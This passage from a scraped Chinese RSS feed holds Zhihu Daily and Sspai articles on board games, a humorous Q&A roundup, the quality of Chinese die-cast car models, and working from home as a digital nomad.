独特的“存档”功能，虽然这个功能并不常用，但是设计者考虑到有的玩家时间有限、一次玩不完一个剧本，就有了这个功能，模拟了电脑游戏的存档</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8a1ad3e43041cd8a0e1411d7f1f70a40_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-1a6368d98e0f0b447d50094a86f13e91_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>密室逃脱类桌游：</strong></p>\n<p>《Escape Room: The Game》是一款看起来非常酷，配件有一个大的密码计时器，需要插入电池使用。玩家需要在限定的时间内，通过图纸、信件、线索等找到密码插入计时器，才能成功逃脱免于灾难。基础版有四个剧本，分别是：越狱主题、病毒主题、炸弹主题、阿兹特克主题。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-3dbb0278a65e63d06572347ad37bb72d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-44148b8d77e8175697ff98543a234ed9_720w.jpg?source=8673f162\" alt=\"\"></figure><p>还有近些年新出的《Exit》和《Unlock！》都是火热的密室逃脱类桌游，模拟电脑上的密室逃脱，非常有趣，在埃森桌游展上大热。由于本人还没有体验过这两款，暂时不做评价，但相信都是很棒的作品。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-c6d33b5d08158c47208e5d705d0f0d39_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《Exit》剧本之一，这个系列有很多剧本，都是单独成盒的</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-c2e6001700fd2ca6935353fa4e9283c9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《Unlock!》三合一装，这个游戏也是有很多单独成盒的剧本，需要配合 app 玩</figcaption></figure><p><strong>“一次性”桌游：</strong></p>\n<p>“一次性”游戏是最近兴起的风潮，这类游戏在每局之间都有剧情的关联和推进，以《瘟疫危机：承传》和《Gloomhaven》为代表，排名猛增，前后冲上了 BGG 排行榜的榜首。上述的《时间守望》也是这种类型的游戏（剧透了就玩不了了）。</p>\n<p>《瘟疫危机：承传》本质上是个新改版的老游戏，但由于加入了“承传”的元素，让它趣味大增，从开始游戏那一刻起，玩家就踏上了一个时刻都有新事件发生的“拯救世界”的征途。游戏过程中会解锁贴纸、刮刮卡等“一次性”道具，导致了这个游戏真的只能玩一次，连二手都不好出。但是从它销售一空的成绩上来看，它的游戏性足以填补它性价比的缺失。个人非常喜欢这一款游戏，目前已通关，期待第二部中。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-1473f0bd3d8a6a10eaf03f7154a23198_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《瘟疫危机：承传》目前 BGG 排名第二</figcaption></figure><p>《Gloomhaven》，当前世界排名第一的游戏，虽然没有像《瘟疫》一样完全“一次性”（没有贴纸什么的），但仍是一款有剧本承传的探险游戏。这款游戏拥有极其丰富的模型，加入了玩家不断“升级”解锁新技能新目标的系统，有点像电脑游戏的设定，还有超厚的故事书给玩家带来十足的代入感。虽是一个以打怪为主的战斗系“美式”游戏，但是又不依赖于骰子，而是使用了一套独特的卡牌作战系统，充满了策略性，在精细的考虑之下还能打出多种 Combo，能够吸引不少“德式”死忠粉。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-1cd9accad40606961dbd0ca213571af6_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-400765168b548e14fc9a083edf38e22f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《Gloomhaven》目前排名第一，亲测盒子真的超大，超重</figcaption></figure><p><strong>“Bios”系列作品</strong></p>\n<p>Bios: Genesis, Bios: Megafauna, Bios:</p>\n<p>Megafauna (second edition)</p>\n<p>真是神奇的桌游！从没见过这种游戏设定！</p>\n<p>《Bios: Genesis》里，玩家要扮演氨基酸、脂、生物色素、以及核酸，听起来简直就像 nerd 玩的游戏哈哈哈！但是你真的不想尝试一下吗？</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-d1b9afe6696340430402bc8c91fbc229_720w.jpg?source=8673f162\" alt=\"\"></figure><p>《Bios: Megafauna》里，玩家扮演史前生物：爬行系或者哺乳系，要在恶劣的生存环境中争夺地盘。这款游戏的亮点是，你根本就不知道它什么时候会结束！游戏结束的方式有多种，可能游戏刚开始 10 分钟就结束了，也可能能玩 2 小时。是一个真正充满了随机性和不确定性的游戏！但是冥冥之中又存在着一些策略，还是要体验后才能体会其中的奥秘</p>\n<p>这个系列的桌游平均重度比较高，玩起来比较难入门，不建议直接带新人玩（聪明的除外）。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-6be7bd899649f6786153540d49915d7d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-9dafb0f3077f36ddb5bc9ce5be0a34be_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/265606673\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737788"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-07-04 23:07:51","description":"\n<div>\n<h2>每次开车直接从 P 挡到 D 挡给油就走，这样会伤车吗？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户，</span><span>有意愿，有能力享受生活。</span>\n<a href=\"https://www.zhihu.com/question/460699882/answer/1971874438\" hidden>阅读原文</a>\n</div>\n<div>\n<p>那不然你还打算档杆上下上下左右左右再再油门油门刹车刹车这么搓一遍解锁个马力加二百匹的隐藏性能再走？</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/460699882\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>你有哪些匿名才敢发出来的照片？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-46319afedbcb53e1897c89527832c2cd_l.jpg?source=8673f162\"><span>葵神，</span><span>又黑又瘦成熟且贫穷的男人</span>\n<a href=\"https://www.zhihu.com/question/302127448/answer/564627355\" hidden>阅读原文</a>\n</div>\n<div>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-3590b09bfbadcde90085924b754bc74b_720w.jpg?source=8673f162\" data-rawwidth=\"1440\" data-rawheight=\"1920\" data-size=\"normal\" data-default-watermark-src=\"https://pic4.zhimg.com/v2-ef4be28fa34394ba59fb7b2ac0599de5_720w.jpg?source=8673f162\" width=\"1440\" data-original=\"https://pic3.zhimg.com/v2-3590b09bfbadcde90085924b754bc74b_720w.jpg?source=8673f162\"></figure><p>00后的舍友</p>\n</div>\n</div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>匿名用户</span>\n<a href=\"https://www.zhihu.com/question/302127448/answer/570276020\" hidden>阅读原文</a>\n</div>\n<div>\n<hr>\n<p>匿名用户：</p>\n<p>这是一个女生……</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-6818d262591dec09a4b0dbc022a191dd_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/302127448\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>你是通过什么事情才知道自己丑的？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-618d79506867f76fbc75ad6888a5e53d_l.jpg?source=8673f162\"><span>千峰月，</span><span>作家、登山客、金融业者、恋旧的凡人</span>\n<a href=\"https://www.zhihu.com/question/313268032/answer/647565657\" hidden>阅读原文</a>\n</div>\n<div>\n<p>见到朋友介绍的“跟你很般配的”相亲对象。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/313268032\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>有什么类似「尼古拉斯·赵四」的名字？</h2>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-04d37a58fb8c60fe3985d81634e26404_l.jpg?source=8673f162\"><span>Turing，</span><span>教书匠/播音主持/前乌云白帽/各种烧钱爱好</span>\n<a href=\"https://www.zhihu.com/question/279123857/answer/894297659\" hidden>阅读原文</a>\n</div>\n<div>\n<p>端木 桶</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/279123857\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>怎么给小孩起小名？</h2>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-fb7a828483fc9f7fe27ca12892f7bb47_l.jpg?source=8673f162\"><span>格林喂养着野兽</span>\n<a href=\"https://www.zhihu.com/question/313290289/answer/662243863\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我一朋友，大名贼好听，他还有一妹妹。</p>\n<p>他叫苏寞，他妹叫苏茉。</p>\n<p>我问他 他妈在家里叫 su mo 叫的谁</p>\n<p>他大手一挥，不是有小名嘛。</p>\n<p>所以。。。。他小名 狗哥</p>\n<p>他妹小名 茉茉</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/313290289\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9737789"},{"title":"中国的模型玩具制造水平达到了什么程度？","date":"2021-07-04 15:30:08","description":"\n<p>说说静态汽车模型吧，简直就是逆袭的典范。</p>\n<p>如果在 10 年前，国产汽车模型还是入门和低端的代名词。那个时候市面上主流的模型，诸如 AutoArt、京商、minichamps，1:18 模型在 500-1000 元的主流价位，1:43 模型在 100-300 左右的价位，做出了非常多经典的汽车模型，形态准确，细节丰富，可玩性也很出色。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7c11c70ad196a980bcfdee470c581725_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"852\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7c11c70ad196a980bcfdee470c581725\" data-watermark-src=\"v2-c8ec50de56be8017abd80e78642eec95\" data-private-watermark-src=\"v2-04a4c476ea895ec860d37592fe13e2a1\"></p>\n<p>比如图上这四台 1:43 的小比例模型，左1和右1是 AutoArt 全盛时期的作品，在不到 10cm 的小尺寸上实现了前轮转向，逼真的车灯细节。在 1:18 的大尺寸上，则有全部车门可开，方向盘车轮转件，内饰和后备箱植绒、独立的安全带扣甚至可动的后排中央扶手箱等等等丰富的细节。更是创造了无数如今难以企及的海景房车型，比如 AutoArt 的奔驰系列：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-83c2e969cf8846da4ed100f43ecad1b6_720w.jpg?rss\" data-rawwidth=\"580\" data-rawheight=\"435\" data-size=\"normal\" data-caption=\"贴吧拿图，原作者：凌云壮志，侵删（这台是原厂版，仅前门能开）\" data-watermark=\"original\" data-original-src=\"v2-83c2e969cf8846da4ed100f43ecad1b6\" data-watermark-src=\"v2-17bc7df3ef0714be36b5121ac85e72d8\" data-private-watermark-src=\"v2-71723eb9500af1ec657a40ef866a8cdf\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-3735704804765db5889039ec0f303b30_720w.jpg?rss\" data-rawwidth=\"580\" data-rawheight=\"435\" data-size=\"normal\" data-caption=\"贴吧拿图，奔驰 280SE，原作者：Chelly，侵删\" data-watermark=\"original\" data-original-src=\"v2-3735704804765db5889039ec0f303b30\" data-watermark-src=\"v2-8645fdde68aaf78442e6c74ab8818ccd\" data-private-watermark-src=\"v2-42e683ed921ba4ff5c7815d543deac30\"></p>\n<p>如果你对以上产品没有什么概念，那我们一起看下同时代的国产模型翘楚，威力 Welly，产品在在 200-300 价位的 1:18 模型，是这样的： </p>\n<p><img src=\"https://pic4.zhimg.com/v2-23bfbf4ec5ede674b17714c5a5a2abd9_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-23bfbf4ec5ede674b17714c5a5a2abd9\" data-watermark-src=\"v2-3e32084170a3a69f736c32875fc2ff63\" data-private-watermark-src=\"v2-378e2378e1e73e30ff2f8c8fc217b27d\"></p>\n<p>虽然已经有了相当不错的型准，但是整体做工相当粗糙，比如粗大且质感低劣的镀铬件，大灯中黑色的固定点，也就是传说中的死鱼眼，还有较弱的可玩性，这款大众 T1 似乎只有 2-3 个门可以开，而相近的舒克的模型，是这样的：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-692cc8ff0f6ef8179ca940d131f32359_720w.jpg?rss\" data-rawwidth=\"1200\" data-rawheight=\"1200\" data-size=\"normal\" data-caption=\"舒克的 T1，变态的全开展示，客运版甚至还有布艺的可动顶棚，图源：东西皇朝，已经好久没有听过这家店了\" data-watermark=\"original\" data-original-src=\"v2-692cc8ff0f6ef8179ca940d131f32359\" data-watermark-src=\"v2-95cbb12c2710378030647dafc371a290\" data-private-watermark-src=\"v2-3f0c2a26e78fbd95ec5a72adc8595779\"></p>\n<p>当然也有稍好一些的，比如威利的林肯领航员，型准、镀铬细节都进步很大，只是后门依旧不能开：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-13d921c3575cfa2d8e0c05e4f30104be_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"717\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-13d921c3575cfa2d8e0c05e4f30104be\" data-watermark-src=\"v2-da3ca76f33ba14ae7b7b9f0e7de5139f\" data-private-watermark-src=\"v2-f8f1a05106fd24ba539a82758b815905\"></p>\n<p>当然，还有一部分模型是可以做到 300-500 左右区间的原厂模型，可以做到全开门，不错的型准，后视镜、油箱盖等小细节可以动，但是差距依旧明显，比如漆面，相比成熟品牌会更容易起疹。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fdf6d41c395799367c82f04d235c705c_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"854\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-fdf6d41c395799367c82f04d235c705c\" data-watermark-src=\"v2-51abdf291b1a91917a257f27ef8f9573\" data-private-watermark-src=\"v2-de872cf7ca173ab5aa00f510a527ebdb\"></p>\n<p> 这是十年前的情况，10 年间，整个静态模型的市场发生了翻天覆地的变化。整个世界范围内，似乎只有中国大陆对于这种大比例的静态模型还保持不错的兴趣和市场规模，其他市场合金静态模型市场快速萎缩，逐渐取而代之的是各种成本更低，形态效果更好，但是全封闭可玩性极低的树脂模型。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6f67128840dfcdb09e837dedbb39564e_720w.jpg?rss\" data-rawwidth=\"750\" data-rawheight=\"500\" data-size=\"normal\" data-caption=\"售价 1200 块的京商世纪树脂模型，内饰居然全是贴纸\" data-watermark=\"original\" data-original-src=\"v2-6f67128840dfcdb09e837dedbb39564e\" data-watermark-src=\"v2-67c7b2acb666bd9c6d8608724960bfed\" data-private-watermark-src=\"v2-6bf4d07a372ae7e18d3e166df2c874f5\"></p>\n<p>曾经在主流价位数一数二的巨头全部转向了其他的方向，迷你切和京商开始减少全开合金模型的开发，更多转向树脂材质，京商尚有劳斯莱斯幻影系列模型撑场，可以调整的座椅、中央扶手箱、后视镜、甚至独立的雨伞，做到巅峰的可玩性。可惜这款产品虽然在不断刷色，但是似乎依旧没有回本。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1d02a668fd20679b522ee531cf557437_720w.jpg?rss\" data-rawwidth=\"796\" data-rawheight=\"796\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1d02a668fd20679b522ee531cf557437\" data-watermark-src=\"v2-794148c736e988ea27da01daad94a8be\" data-private-watermark-src=\"v2-0f51947cf723ad069a74c5c6aef7936f\"></p>\n<p>迷你切的合金系列甚至开始出现无法做到全开的作品，退步相当大，比如奥迪 RS6 模型，堪称耻辱，现在更是玩上了合金龟车。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6b6220b91706ae21e3bccd405e35bddd_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-6b6220b91706ae21e3bccd405e35bddd\" data-watermark-src=\"v2-14a6154e108378d9f46daecd38dfa375\" data-private-watermark-src=\"v2-206f0e04ca7a080b4acd9c34aa8755c6\"></p>\n<p>AutoArt 倒是一直坚持在高品质全开门模型上，但是材质从锌合金转变为复合材质，说人话就是，有了更多塑料材料的成分在，售价也逐渐涨到 1000 甚至 1500 以上，并复刻了不少曾经的经典车型，比如捷豹 E-Type。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c72719d872a2292d3774b9b2bc0ad1ef_720w.jpg?rss\" data-rawwidth=\"1620\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c72719d872a2292d3774b9b2bc0ad1ef\" data-watermark-src=\"v2-11fc85857100ff0d9f9f3b18ce44df97\" data-private-watermark-src=\"v2-3561dc3245e980fb86eaf02933ea956e\"></p>\n<p>而在大陆这篇目前最为繁茂的成品合金模型市场上，又有广东这个曾经几乎主流品牌都有代工厂的所在地，目前的国产模型已经是这个样子了：</p>\n<p>首先是因为知名大 V 许群加入而知名度极高的 Almost Real，起点就相当高，1000 元出头的路虎系列和奔驰迈巴赫系列，做出了相当丰富的细节、可动件，这在除了 AA 以外的主流价位海外品牌身上已经许久没有看到了，如今产品价格也冲向了 1500 以上更高的区间。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7de9e6847d3f5d1bc2f2d796ef195208_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"1149\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7de9e6847d3f5d1bc2f2d796ef195208\" data-watermark-src=\"v2-a802de625c91351837198f43cf8c7a09\" data-private-watermark-src=\"v2-f466467d0e34c3eb2dccf60e12c0c555\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-1f846442c0f1046649c9d21bb991baf9_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"1140\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1f846442c0f1046649c9d21bb991baf9\" data-watermark-src=\"v2-e95b9757651ede083ec0449bddcb0d3e\" data-private-watermark-src=\"v2-a53f2529a9c4d7b360620a8ff2289c81\"></p>\n<p>世纪龙也是近两年异军突起的一个新兴品牌，这家总部设在香港的模型品牌是做红旗模型最好的牌子，在不到千元的价格里把红旗还原到极致。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-993b98096c38c2c04619e27508e658f2_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"854\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-993b98096c38c2c04619e27508e658f2\" data-watermark-src=\"v2-e635b12e316d809e9c85f4bf4196e81e\" data-private-watermark-src=\"v2-ca4d719a5904c1c62ebd0d79840dcae7\"></p>\n<p>然后是小光最新的 1:18 凯迪拉克 Fleetwood：同样全开模型，美式豪华车的大皮革沙发细节，中网的镂空，展现的淋漓尽致，价格也达到了 1350 元。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c384a64b33065af7fc53589d040d958a_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"375\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c384a64b33065af7fc53589d040d958a\" data-watermark-src=\"v2-bfbc21c19f05c6014b938a79c36b02d1\" data-private-watermark-src=\"v2-35366950f29d3ac8538fda73724049b6\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-096925c6cd2e414c3b05415284768a7d_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"375\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-096925c6cd2e414c3b05415284768a7d\" data-watermark-src=\"v2-a3be635d5c732547b487a401e7473449\" data-private-watermark-src=\"v2-4831629998746d64a157f7bd6a25a598\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4d0f278c00f9b59a4313bb6e80583948_720w.jpg?rss\" data-rawwidth=\"975\" data-rawheight=\"975\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4d0f278c00f9b59a4313bb6e80583948\" data-watermark-src=\"v2-532be36521a266bea25833b7024f99de\" data-private-watermark-src=\"v2-afcceadbd5988fed39e5ab03076253ed\"></p>\n<p>其辉虽然和其他品牌比起来有些弱，但是在 1000 元左右也有立得住脚的产品，比如堪称 CMC 平替的普尔曼，相比 CMC 4000 多的售价，其辉用 1600 元做出了八成功力，也是相当不错的选择。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8dc3c9f5c3ec4b10cae340198fd08049_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"481\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-8dc3c9f5c3ec4b10cae340198fd08049\" data-watermark-src=\"v2-b365658a7116b1620df1b979da6162a6\" data-private-watermark-src=\"v2-b0c09efb5d3cc3ee6c2225c58042e511\"></p>\n<p>如今国产模型已经冲刺到较高端的主流市场，同时收到了市场的认可。这些品牌能和 AA 能打的有来有回，虽然 Almost Real  因为收藏路线问题一直没有收，Fleetwood 已经是确定要入的了，至于其辉，我已经有 CMC 了，再买问题就在房子不在模型了……</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a43c1be4bb9e3d44d36bae2dbcfe7ad6_720w.jpg?rss\" data-rawwidth=\"1620\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a43c1be4bb9e3d44d36bae2dbcfe7ad6\" data-watermark-src=\"v2-7caa3d6d6c831a8c6d6fd5c8ffeb46b2\" data-private-watermark-src=\"v2-14e834606ccda55a7f30693466ecd654\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/mo-fu-ping-sheng-zhi?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">逐行扫描</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/40669780/answer/1978083632?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">259 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/268619884?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">小孩子经常打扰我工作，有什么方法或者玩具车能让他安静的呆一边玩去？</a><br><a href=\"http://www.zhihu.com/question/265589988?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">想找一个拼装玩具？</a><br>\n","link":"http://www.zhihu.com/question/40669780/answer/1978083632?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"逃离办公室以后，我们去哪？","date":"2021-07-04 09:02:36","description":"\n<blockquote><p>封面故事是每期《少数派报告》的主线文章，通常会围绕当期主题展开讨论和分析，并给出具体的观点或方法论。</p></blockquote>\n<p>其实在更早之前，我也曾身为一个数字游民，拿着高于北京基本线的工资，生活过国内数个二三线城市，甚至到清迈旅居了俩月——而我也曾无数次向朋友形容过那是我毕业至今最快乐的一段时光。</p>\n<p>彼时，我在清迈通过 Airbnb 长租了一套公寓，折算下来每月租金在三千块，是一个五十平左右的酒店式公寓，拥有独立的卧室、客厅、厨房和卫生间，家具家电齐全，甚至还有每周一次的上门保洁，包含所有寝具的换洗。而在入住之后我才知道，若是通过正规中介渠道长租（半年以上），同样条件的公寓价格通常只在两千块钱以内。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/31/article/bc5206dd28a318154db03967258368dd\"></figure><p>清迈当地的生活成本低到我无法想象——二十块钱以内我可以吃到半只烤鸡套饭或层层叠满的海鲜面，八块钱一杯的冰咖啡品质并不次于国内动辄三四十一杯的精品咖啡店出品，总之每日一百块钱不到的花销足以让我顿顿大肉餐餐伴奶茶配咖啡。以在北京同样的生活条件作比，在清迈只需要三分之一不到的支出。更何况，清迈还有绝美的风景和愉悦的人文环境。</p>\n<p>在那段时间里，因为与国内有一个小时的时差，并且日落较迟，让我有了「每天时间更多」的错觉。我去了大象保护营做志愿者，报名了厨师学校学习泰餐，以及各种类似多达三十几道的丛林飞跃和足足俩小时的野外卡丁车。但正如我前文所说，单机游戏的快乐不是真正的快乐，长时间四处奔走「明天不知道会在哪」的空虚感被不断放大，以至于我最终还是决定回到我曾说过「永远不会回来」的家乡。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/31/article/efe2d0ef1e7afff5d098672c945d008f\"><figcaption>第一次参加泼水节也第一次让我身临其境了「世界大同」</figcaption></figure><p>回来后，我报复性地进入了一家朝九晚六的传统国企工作了两年，然后买了「我应该这辈子都不会买的房」，并跳槽到少数派开启了「在家办公」的新生活。当我在这个状态下去思考「这地儿是家，还是办公室」时，答案也复杂了许多。</p>\n<h2>工作和生活要不要分开？</h2>\n<p>在前一份国企的工作中，我是非常典型的「下班后公司垮了都与我无关」的状态，但我的实际感受并不轻松，反而每天都反复重演着上班前的焦虑和上班时的焦灼，特别是每个周末的最后一天，有一种「明天又要为奴」的烦扰。这并不是因为我有多讨厌这份工作，而是因为这世上就不可能有人喜欢工作，当「工作」被框定到具体的时间和空间里时，每一次工作与否的切换都意味着我需要从思维、社交、状态、行为乃至作息方方面面的变化——而其中总有不舒适。</p>\n<p>除了少数派的同事，我身边也有不少同样在家办公的朋友，大家最常聊起的话题是「如何把工作和生活分开」，这是因为当没有明显的上下班「仪式」后，我们很容易陷入一种颠倒混乱的状态，例如写下这些文字的此刻，是午夜两点。这种时刻并不少见，通常是因为撰稿的特殊性，落笔前可能需要先经过一段时间的资料搜集、阅读及构思，而大部分时候即便已经万事俱备建好空白文档，我可以发呆俩小时一个字都写不出来；但是一到晚上，常会文思泉涌下笔如有神。</p>\n<p>身边有两个比较典型的朋友，一个是做产品设计，另一个是技术开发，他们会严格限制自己的工作时间，在朝九晚五这个时间段内，他们会穿戴整齐笔直落座开启一天的工作，五点后下班时间到就回到自己的生活，无论是健身还是朋友聚会，都会让时间尽可能回到自己的掌控。当然也会有意外，例如在工作日有不得不去办理的私事，或者一场难得凑上的聚会，他们也会临时将工作时间后移到晚上或周末。</p>\n<p>我曾有一段时间试图向他们靠近，但是无果，主要原因还是撰稿工作的特殊性，无论是前期准备工作还是后续的撰文，大部分时候它都是一个连贯的行为，无法严格做到闹钟一响立刻关闭电脑停止工作；而最常见的可能连着两个工作日都没有思绪下笔，周末或者午夜的某个时刻却突然开窍了那这时候必须得乘胜追击。</p>\n<p>于是我放弃了这个执念，换了一个视角去看待它：<strong>之所以有这个问题是因为担恐工作和生活互相影响，那如果把工作也视作生活的一部分呢？</strong>在家办公最大的利好其实就是「灵活」，我们尽可能把一天要做的事情提前规划好——会议、沟通、撰稿、烹饪、健身甚至看剧，坦然认知每一件事都有它的重要性，并安排好时间，例如有一篇稿子死线三天，到了第二天完成度还不到一半，那么当天和隔天就别看剧了，并且点外卖饱腹即可，再不济延期一场约会；下一次，我在死线前便做完了工作，多出来的时间便坦然玩耍。只需要保证一个原则——倘若这项工作是协作完成的话，尽可能不要影响别人。</p>\n<p>就我目前对这套准则的实践情况来看，虽然偶有失控导致整体拖延的情况，但大部分时候都能按部就班地前进。我想，对于每一个在家办公者来说或许也应该调整一下自己的观念——这种工作模式本就灵活且特殊，而我们用传统思维去考量是无法解答的，不如以自己的实际状况着手，去规划出一种更符合自身期待的工作方式。</p>\n<h2>创造自己的工作区</h2>\n<p>「跳出舒适区」是媒体常用的话术，通常用来激励或赞美那些勇于打破规则追求更好人生的先行者，以至于似乎「舒适区」都成了一种贬义词。</p>\n<blockquote><p>舒适区是一种精神状态，它导致人们进入并且维持一种不现实精神行为之中，这种情况会给人带来一种非理性的安全感。类似惰性，当人围绕自己生活的某一部分建立了一个舒适区之后，他就会开始倾向于待在舒适区内，而不是走出舒适区。走出一个人的舒适区，他们必须在新的环境中找到新的不同的行动方式，同时回应这些新的行动方式所导致的后果。</p></blockquote>\n<blockquote><p>走出舒适区会增加人的焦虑程度，从而产生应激反应，其结果是提升对工作的专注程度。在这个区域中被称作最佳表现区——在这个区域之中，人的工作表现将会得到改善，并且他们的技巧也会被优化。但是罗伯特·耶基斯于 1907 年的报告中提到「焦虑可以改善工作表现，但是当超过某一最佳激励状态之后，工作表现就开始恶化」，如果一个人离开最佳表现区，他将进入一个危险区，在危险区中焦虑程度的上升或者舒适程度下降会带来工作表现的快速恶化。</p></blockquote>\n<p><a href=\"https://zh.wikipedia.org/wiki/%E8%88%92%E9%80%82%E5%8C%BA\" 